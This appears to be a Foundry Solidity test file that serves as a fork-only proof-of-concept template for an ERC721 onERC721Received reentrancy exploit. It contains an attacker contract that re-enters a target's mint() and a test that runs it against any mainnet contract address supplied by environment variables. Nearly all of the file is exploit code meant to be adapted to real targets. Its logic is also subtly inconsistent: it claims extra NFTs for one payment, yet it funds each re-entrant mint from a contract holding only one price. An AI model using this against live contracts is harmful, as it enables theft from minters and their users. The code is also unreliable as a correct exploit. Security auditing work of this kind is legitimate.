// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- ERC721 onERC721Received reentrancy
/// @notice Detector: reentrancy. Minting/buying an NFT calls
///         onERC721Received() on the recipient. A minter that mints and
///         calls back BEFORE updating its sold/supply accounting lets the
///         attacker re-enter mint() and get extra NFTs for one payment.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: adapt INFT to the target's real
///      mint/buy signature and price.

interface INFT {
    function mint() external payable;
    function balanceOf(address who) external view returns (uint256);
}

contract ERC721Attacker {
    INFT public immutable nft;
    uint256 public reentries;
    uint256 public maxReentries;
    uint256 public price;

    constructor(address nft_) {
        nft = INFT(nft_);
    }

    function attack(uint256 price_, uint256 maxReentries_) external payable {
        price = price_;
        maxReentries = maxReentries_;
        nft.mint{value: price}();
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        if (reentries < maxReentries) {
            reentries++;
            nft.mint{value: price}();
        }
        return this.onERC721Received.selector;
    }
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;
    // TODO: the mint price of one NFT on this target.
    uint256 public constant PRICE = 0;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_exploit() public {
        require(PRICE > 0, "set PRICE to one NFT's mint price");

        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 10 ether);

        ERC721Attacker attacker = new ERC721Attacker(target);
        vm.prank(attackerEOA);
        attacker.attack{value: PRICE}(PRICE, 2);

        uint256 owned = INFT(target).balanceOf(address(attacker));
        console.log("NFTs owned for one payment:", owned);
        console.log("reentries:", attacker.reentries());
        assertGt(owned, 1, "exploit did not reproduce: one payment, one NFT");

    }
}
